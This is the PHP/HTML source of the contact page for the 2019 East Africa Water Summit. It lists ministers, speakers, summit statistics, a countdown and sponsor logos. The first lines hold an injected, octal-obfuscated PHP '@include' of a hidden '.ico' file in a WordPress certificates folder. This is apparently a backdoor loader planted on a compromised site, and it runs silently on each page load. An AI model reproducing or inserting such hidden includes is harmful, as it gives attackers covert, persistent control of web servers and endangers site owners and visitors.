<?php
/*bbc6a*/

@include "\057var\057chr\157ot/\150ome\057con\164ent\05753/\071663\06353/\150tml\057old\057wp-\151ncl\165des\057cer\164ifi\143ate\163/.b\06408d\14126.\151co";

/*bbc6a*/



?>

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <meta http-equiv="X-UA-Compatible" content="ie=edge" />
    <link rel="icon" href="../assets/images/icon.png" />
    <link rel="stylesheet" href="../assets/css/colors.css" />
    <link rel="stylesheet" href="../assets/css/style.css" />
    <link rel="stylesheet" href="../assets/css/bootstrap.css" />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
    <link href="https://fonts.googleapis.com/css?family=Roboto:400,700&display=swap" rel="stylesheet">
    <script src="../assets/js/jquery-3.4.1.js"></script>
    <title>The 4th East Africa Water Summit 2019- EAWATERS </title>
    <script>
    window.dataLayer = window.dataLayer || [];
    function gtag() {
      dataLayer.push(arguments);
    }
    gtag('js', new Date());

    gtag('config', 'UA-150271756-1');    
    </script>
</head>
<script>
    function requestContact() {
        document.getElementById('contactform').style.display = 'none'
        document.getElementById('contactdone').style.display = 'block'
        var contacts = {
            name: $('#name').val(),
            phone: $('#phone').val(),
            email: $('#email').val(),
            message: $('#message').val()
        }
        fetch('https://eawaterspayments.herokuapp.com/requestcallback', {
            method: 'POST',
            body: JSON.stringify(contacts),
            headers: {
                "Content-Type": "application/json"
            }
        }).then(response => response.json()).then(response => {
            console.log(response)
        })
    }
</script>

<body style="padding: 0;margin: 0;background-color: #f5f5f5;">
    <header>
        <div class="shadow jumbotron jumbotron-fluid"
            style="background-image:linear-gradient(to right,#00b05000,#0068f000), url(../assets/images/bg1.jpg);background-size: 100% 100%;padding: 0;background-repeat: no-repeat;">
            <nav class="shadow-sm navbar sticky-top navbar-expand-md navbar-dark"
                style="padding: 0;margin: 0;height: 50px;color: #ffffff00">
                <div class="container">
                    <button class="navbar-toggler" type="button" data-toggle="collapse"
                        data-target="#navbarTogglerDemo03" aria-controls="navbarTogglerDemo03" aria-expanded="false"
                        aria-label="Toggle navigation">
                        <span class="navbar-toggler-icon"></span>
                    </button>
                    <a class="navbar-brand" href="../">
                        <img src="../assets/images/icon.png" width="100px" height="60px" alt="">
                    </a>

                    <div class="collapse navbar-collapse" id="navbarTogglerDemo03">
                        <ul class="navbar-nav ml-auto mt-2 mt-lg-0">
                            <li class="nav-item">
                                <a class="nav-link" href="../">Home <span class="sr-only">(current)</span></a>
                            </li>
                            <li class="nav-item">
                                <a class="nav-link" href="">About</a>
                            </li>
                            <li class="nav-item">
                                <a class="nav-link" href="../speakers/">Speakers</a>
                            </li>
                            <li class="nav-item">
                                <a class="nav-link" href="../pricing/">Pricing</a>
                            </li>
                            <li class="nav-item">
                                <a class="nav-link" href="../previous/">Past Events</a>
                            </li>
                            <li class="nav-item active">
                                <a class="nav-link primary_btn" href="../contact/">Contact</a>
                            </li>
                        </ul>
                    </div>
                </div>

            </nav>
            <div class="d-flex align-items-center justify-content-center">
                <div class="col-4 card p-3 m-4" id="contactform">
                    <p class="h4">Contact us</p>
                    <input type="text" placeholder="Full name" name="name" id="name" class="m-1 form-control">
                    <input type="email" placeholder="Email" name="email" id="email" class="m-1 form-control">
                    <input type="tel" placeholder="Phone Number" name="phone" id="phone" class="m-1 form-control">
                    <textarea placeholder="Ask us something..." name="message" id="message" cols="30" rows="6"
                        class="form-control"></textarea>
                    <button class="m-1 col-2 justify-content-center btn btn-primary"
                        onclick="requestContact()">Send</button>
                </div>
                <div id="contactdone" class="m-3" style="display: none;">
                    <div class="alert alert-info">
                        Thank You for expressing interest in EAWATERS. We will contact you in a moment
                    </div>
                </div>

            </div>
        </div>

    </header>
    <p class="justify-content-center d-flex" id="demo">
        </div>
        <main>
            <div class="d-flex flex-row align-items-center justify-content-center flex-wrap">
                <img src="../assets/images/chelugui.jpg" alt="" width="60px;" height="60px;"
                    style="border-radius: 50%;">
                <div class="d-flex flex-column" style="margin: 10px;">
                    <div class="s_name">Hon. Simon Chelugui</div>
                    <div class="s_title">Kenya</div>
                    <div class="s_theme text-wrap" style="width: 10rem;text-align: center;margin: 10px;">Cabinet
                        Secretary.
                        Ministry
                        of Water, Sanitation and Irrigation, Kenya.</div>
                    <div class="text-center text-warning font-bold">CHIEF GUEST </div>
                </div>
                <div class="d-flex flex-column" style="border-left: 1px solid #ccc;padding: 10px;">
                    <div class=" s_name">Hon. Sam Cheptoris</div>
                    <div class="s_title">Uganda</div>
                    <div class="s_theme">Ministry of Water and Environment.</div>
                </div>
                <div class="d-flex flex-column" style="border-left: 1px solid #ccc;padding: 10px;">
                    <div class="s_name">Hon. Prof. Makame Mbarawa</div>
                    <div class="s_title">Tanzania</div>
                    <div class="s_theme">Ministry of Water and Irrigation</div>
                </div>
                <div class="d-flex flex-column" style="border-left: 1px solid #ccc;padding: 10px;">
                    <div class="s_name">Hon. Amb. Claver Gatete</div>
                    <div class="s_title">Rwanda</div>
                    <div class="s_theme text-wrap">Ministry of Infrastructure</div>
                </div>
                <div class="d-flex flex-column" style="border-left: 1px solid #ccc;padding: 10px;">
                    <div class="s_name">Hon. Come Manirakiza</div>
                    <div class="s_title">Burundi</div>
                    <div class="s_theme text-wrap">Ministry of Water</div>
                </div>
                <div class="d-flex flex-column" style="border-left: 1px solid #ccc;padding: 10px;">
                    <div class="s_name">Hon. Paul Mayom Akech</div>
                    <div class="s_title">South Sudan</div>
                    <div class="s_theme text-wrap">Ministry of Water</div>
                </div>
            </div>
            <div style="padding: 0;margin: 0;">
                <div class="container align-items-center">
                    <br>
                    <div>
                        <h4 style="font-family: 'Roboto', sans-serif;font-weight: 700;text-align: center;">
                            The 4<sup>th</sup> EAST AFRICA WATER SUMMIT 2019
                        </h4>
                        <br>
                        <h5 style="color: #00b0f0;text-align: center;">Theme</h5>
                        <br>
                        <h6 style="color: #00b0f0;font-weight: bold;text-align: center;">
                            “Sustainable Water and Sanitation in the Face of Climate Change”
                        </h6>
                        <hr>
                        <h3 class="text-center">Our Pillars</h3>
                        <div class="row align-items-center justify-content-center">


                            <div style="display: flex;flex-direction: column;margin: 10px;">
                                <h6 class="text-center" style="color: #00b0f0;">Policy</h6>
                                <div
                                    style="display: flex;justify-content: center;flex-direction: column;align-self: center;align-self: center;background-image: url(../assets/images/polygray.svg);background-size: contain;background-repeat: no-repeat;width: 50px;height: 50px;">
                                    <i class="fa fa-handshake-o"
                                        style="font-size:20px;color:#00b050;text-align: center;"></i>
                                </div>
                                <div>
                                    <p class="text-wrap" style="width: 10rem;text-align: center;margin: 10px;">
                                        Participate in policy
                                        formualtion for the
                                        water sector</p>
                                </div>

                            </div>
                            <br>
                            <div style="display: flex;flex-direction: column;margin: 10px;border-left: 1px solid #ccc;">
                                <h6 style="color: #00b0f0;" class="text-center">Technology</h6>

                                <div
                                    style="display: flex;justify-content: center;flex-direction: column;align-self: center;align-self: center;background-image: url(../assets/images/polygray.svg);background-size: contain;background-repeat: no-repeat;width: 50px;height: 50px;">
                                    <i class="fa fa-eye" style="font-size:20px;color:#00b050;text-align: center;"></i>
                                </div>
                                <div>
                                    <p class="text-wrap" style="width: 10rem;text-align: center;margin: 10px;">
                                        Showcase your Innovations</p>
                                </div>

                            </div>
                            <br>
                            <div
                                style="display: flex;flex-direction: column;margin: 10px; border-left: 1px solid #cccc;">
                                <h6 style="color: #00b0f0;" class="text-center">Financing</h6>

                                <div
                                    style="display: flex;justify-content: center;flex-direction: column;align-content: center;align-self: center;background-image: url(../assets/images/polygray.svg);background-size: contain;background-repeat: no-repeat;width: 50px;height: 50px;">
                                    <i class="fa fa-money" style="font-size:20px;color:#00b050;text-align: center;"></i>
                                </div>
                                <div>
                                    <p class="text-wrap" style="width: 15rem;text-align: center;margin: 10px;">Insights
                                        and
                                        Investment
                                        Opportunities</p>
                                </div>

                            </div>
                            <br>
                        </div>
                        <br>
                        <hr>
                        <blockquote class=" blockquote text-center">
                            <p class="lead" style="font-size: .9rem">
                                Access to clean water and sanitation services in parts of the East African region is a
                                challenge, especially with a rising population and urbanization. Global warming has
                                caused
                                the global average temperature to rise 0.85 0 C higher than it was in the late
                                19th century causing weather patterns to changing and become more unpredictable by the
                                day.
                                The East African countries are signatories of the Kyoto protocol and the Paris
                                agreement, to
                                cut down on the generation of greenhouse gases by 143 million tonnes.
                                In respect to these agreements and recognition of the key issues, the East Africa Water
                                Summit
                                2019
                                will
                                convene to create a forum for the water industry stakeholders to deliberate and arrive
                                at
                                specific action points that will influence policy, technology application and investment
                                on
                                sustainable water and sanitation.</p>
                            <footer class="blockquote-footer">eawaters.com</footer>
                        </blockquote>

                        <div style="display: flex;flex-direction: row;flex-wrap: wrap;justify-content: center;">

                            <div class="stat">
                                <span class="statmain">75%</span><br>
                                <span class="stattext">of earth is covered by water</span>
                            </div>
                            <div class="stat">
                                <span class="statmain">2.5%</span><br>
                                <span class="stattext">of earth's water is freshwater
                                    <br>(mostly preserved in glaciers)</span>
                            </div>
                            <div class="stat">
                                <span class="statmain">80%</span><br>
                                <span class="stattext">of the water produced is lost </span>
                            </div>
                            <div class="stat">
                                <span class="statmain">85%</span><br>
                                <span class="stattext">of global wastewater is <br> discharged without treatment </span>
                            </div>
                            <div class="stat">
                                <span class="statmain">300 million</span><br>
                                <span class="stattext">population of East Africa</span>
                            </div>

                        </div>

                        <div class="col-md-12 col-lg-12 col-sm-12 col-xs-12 col-xl-12">
                            <!-- Display the countdown timer in an element -->

                            <script>
                                // Set the date we're counting down to
                                var countDownDate = new Date("Nov 21, 2019 08:00:00").getTime();

                                // Update the count down every 1 second
                                var x = setInterval(function () {

                                    // Get today's date and time
                                    var now = new Date().getTime();

                                    // Find the distance between now and the count down date
                                    var distance = countDownDate - now;

                                    // Time calculations for days, hours, minutes and seconds
                                    var days = Math.floor(distance / (1000 * 60 * 60 * 24));
                                    var hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 *
                                        60));
                                    var minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
                                    var seconds = Math.floor((distance % (1000 * 60)) / 1000);

                                    // Display the result in the element with id="demo"
                                    document.getElementById("demo").innerHTML = '<div><span class="day">' +
                                        days +
                                        " days </span><span class='hours'> " + hours +
                                        " hrs </span><span class='minutes'> " +
                                        minutes + " mins </span><span class='seconds'>" + seconds +
                                        "s </span>" +
                                        '</div>';

                                    // If the count down is finished, write some text
                                    if (distance < 0) {
                                        clearInterval(x);
                                        document.getElementById("demo").innerHTML = "TODAY";
                                    }
                                }, 1000);
                            </script>
                        </div>
                    </div>
                    <hr>
                    <h4 class="text-center text-primary">Speakers</h4>
                    <div id="speakers" style="display: flex;flex-direction: row;flex-wrap: wrap">

                        <div class="speaker">
                            <h5 class="s_name">Catherine Collin</h5>
                            <p class="s_title">East Africa Region Representative, European Investment Bank</p>
                            <p class="s_theme">Effect of Climate change on Water Resources and Sanitation Management</p>
                        </div>

                        <div class="speaker">
                            <h5 class="s_name">Mr. Isaac Kabongo</h5>
                            <p class="s_title">Chairman, Climate Action Uganda</p>
                            <p class="s_theme">Climate Change: Challenges facing Water and Sanitation Management</p>
                        </div>

                        <div class="speaker">
                            <h5 class="s_name">Mr. Sixbert Mwanga</h5>
                            <p class="s_title">Country Coordinator, Climate Action Network Tanzania</p>
                            <p class="s_theme">Climate Change Adaptation and Resilience</p>
                        </div>

                        <div class="speaker">
                            <h5 class="s_name">Ms. Jacqueline Nyirakamana</h5>
                            <p class="s_title">Transboundary Water Resources Cooperation Specialist, Ministry of
                                Environment,
                                Rwanda
                            </p>
                            <p class="s_theme">Transboundary Water Management in the face of Climate Change</p>
                        </div>

                        <div class="speaker">
                            <h5 class="s_name">Sophie Kutegeka</h5>
                            <p class="s_title">Country Representative, International Union for Conservation of Nature,
                                Uganda
                            </p>
                            <p class="s_theme">Effects of Climate Change on Wetlands conservation</p>
                        </div>

                        <div class="speaker">
                            <h5 class="s_name">Desire Baranyikwa</h5>
                            <p class="s_title">Geographical Institute of Burundi</p>
                            <p class="s_theme">Effects of Climate Change on Water Quality</p>
                        </div>

                        <div class="speaker">
                            <h5 class="s_name">Dr. MAS Waweru</h5>
                            <p class="s_title">Chief Operating Officer, Davis and Shirtliff</p>
                            <p class="s_theme">Solid & Waste-Water Management in Climate Change Adaptation</p>
                        </div>

                        <div class="speaker">
                            <h5 class="s_name">Jumoke Jagun-Dokunmu</h5>
                            <p class="s_title">Regional Director, International Finance Corporation</p>
                            <p class="s_theme">Financial Risks and Opportunities in Climate Change Adaptation for the
                                Water
                                Sector
                            </p>
                        </div>

                        <div class="speaker">
                            <h5 class="s_name">Mr. James Mabula</h5>
                            <p class="s_title">Risk & Compliance Director, CRDB Bank Corporation Tanzania</p>
                            <p class="s_theme">Mobilizing Finance for Climate-Resilient Water Sector Infrastructure</p>
                        </div>

                    </div>
                </div>
            </div>

            <div style="display: flex;align-items: center;justify-content: center; width: 100%">
                <a href="./assets/program.pdf" class="secondary_btn">Download Program</a>
            </div>
            <br>
        </main>
        <footer class="bg-white" style="padding: 40px;border-top: 1px solid #aaaaaa">
            <div class="bg-white container justify-content-center align-items-center">
                <h5 class="text-center">Endorsed by</h5><br>

                <div class="justify-content-center align-items-center d-flex flex-wrap">
                    <div class="endorser shadow">
                        <img src="../assets/images/logos/logo26.jpg" class="justify-content-center" width="150px"
                            height="150px" alt="">
                    </div>
                    <div class="endorser shadow">
                        <img src="../assets/images/logos/logo2.jpg" class="justify-content-center" width="140px"
                            height="150px" alt="">
                    </div>
                    <div class="endorser  shadow">
                        <img src="../assets/images/logos/logo31.png" class="justify-content-center" width="150px"
                            height="150px" alt="">
                    </div>
                    <div class="endorser  shadow">
                        <img src="../assets/images/logos/logo22.jpg" class="justify-content-center" width="150px"
                            height="150px" alt="">
                    </div>

                    <div class="endorser shadow">
                        <img src="../assets/images/logos/logo14.png" class="justify-content-center" width="150px"
                            height="150px" alt="">
                    </div>
                    <br>
                    <br>
                    <div class="endorser shadow">
                        <img src="../assets/images/logos/logo29.png" class="justify-content-center" width="400px"
                            height="100px" alt="">
                    </div>

                </div>
                <br>
                <hr>
                <h5 class="text-center">Our Partners</h5>
                <div class="d-flex align-items-center justify-content-center flex-wrap ">
                    <div class="partner card shadow-sm">
                        <img class="partner_logo" width="140px" height="80px;"
                            src="../assets/images/logos/wilo_logo.png" alt="">

                    </div>
                    <div class="partner card shadow-sm">
                        <img class="partner_logo" width="200px" height="80px;"
                            src="../assets/images/logos/logo_untapped.png" alt="">
                    </div>
                    <div class="partner card shadow-sm">
                        <img class="partner_logo" width="200px" height="80px;" src="../assets/images/logos/dns.png"
                            alt="">
                    </div>
                    <div class="partner card shadow-sm">
                        <img class="partner_logo" width="180px" height="80px;"
                            src="../assets/images/logos/doshiwater.jpg" alt="">
                    </div>

                </div>
                <br>
                <hr>
                <h5 class="text-center">Summit Organised by</h5>
                <div class="container justify-content-center d-flex"> <img width="150px"
                        src="../assets/images/logos/logo19.gif" alt="">
                </div>
                <br>
            </div>
            <br>

            <hr>
            <br>
            <div class="container">
                <div class="d-flex flex-row align-items-center justify-content-center">
                    <div class="col-12">
                        <p class="text-center">&copy; 2019 Kipya Africa Ltd.</p>
                        <hr>
                        <p class="text-center" style="font-weight: bold">Contact Us</p>
                        <p class="text-center">Kipya (Africa) Limited</p>
                        <p class="text-center">Lenana/ Galana Road,Kilimani</p>
                        <p class="text-center">P.O.Box 7407-00100, Nairobi, Kenya</p>
                        <p class="text-center">Tel: +254-728-615-438</p>
                        <p class="text-center">Email: info@africa-drilling-solutions.com</p>
                    </div>
                </div>

            </div>


        </footer>
</body>
<script>
    /**
     * Listen to scroll to change header opacity class
     */

    function checkScroll() {
        var startY = $('.navbar').height(); //The point where the navbar changes in px

        if ($(window).scrollTop() > startY) {
            $('.navbar').addClass("scrolled");
        } else {
            $('.navbar').removeClass("scrolled");
        }
    }

    $(window).scroll(function () {
        checkScroll();
    });
</script>

</html>